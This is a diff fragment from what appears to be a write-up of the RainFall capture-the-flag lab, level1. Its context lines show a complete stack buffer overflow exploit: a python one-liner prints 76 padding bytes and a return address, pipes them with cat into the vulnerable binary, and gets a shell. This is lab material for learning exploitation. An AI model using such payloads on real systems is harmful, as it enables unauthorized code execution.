@@ -76,6 +76,8 @@ Good... Wait what?
 Segmentation fault (core dumped)
 
 We need to use cat, so that the program wait for an input from stdin
+-------------------------------
+
 level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
 Good... Wait what?
 ls
